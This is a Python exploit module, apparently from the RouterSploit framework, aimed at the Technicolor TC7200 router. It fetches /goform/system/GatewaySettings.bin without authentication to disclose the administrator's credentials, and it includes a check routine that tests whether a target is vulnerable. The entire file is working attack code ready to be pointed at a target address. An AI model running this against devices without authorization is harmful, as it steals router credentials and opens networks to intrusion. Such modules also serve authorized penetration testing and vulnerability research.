from routersploit import (
    exploits,
    print_success,
    print_error,
    print_info,
    print_status,
    http_request,
    mute,
    validators,
)


class Exploit(exploits.Exploit):
    """
    Exploit implementation for Technicolor TC7200 password disclosure vulnerability.
    If the target is vulnerable, it allows read credentials for administration user.
    """
    __info__ = {
        'name': 'Technicolor TC7200 Password Disclosure',
        'description': 'Module exploits Technicolor TC7200 password disclosure vulnerability which allows fetching administration\'s password.',
        'authors': [
            'Jeroen - IT Nerdbox',  # vulnerability discovery
            'Marcin Bury <marcin.bury[at]reverse-shell.com>',  # routersploit module
        ],
        'references': [
            'https://www.exploit-db.com/exploits/31894/',
        ],
        'devices': [
            'Technicolor TC7200',
        ]
    }

    target = exploits.Option('', 'Target address e.g. http://192.168.1.1', validators=validators.url)
    port = exploits.Option(80, 'Target Port')

    def run(self):
        url = "{}:{}/goform/system/GatewaySettings.bin".format(self.target, self.port)

        response = http_request(method="GET", url=url)
        if response is None:
            return

        if response.status_code == 200 and "0MLog" in response.text:
            print_success("Exploit success")
            print_status("Reading GatewaySettings.bin...")
            print_info(response.text)
        else:
            print_error("Exploit failed. Device seems to be not vulnerable.")

    @mute
    def check(self):
        url = "{}:{}/goform/system/GatewaySettings.bin".format(self.target, self.port)

        response = http_request(method="GET", url=url)
        if response is None:
            return False  # target is not vulnerable

        if response.status_code == 200 and "0MLog" in response.text:
            return True  # target is vulnerable
        else:
            return False  # target is not vulnerable
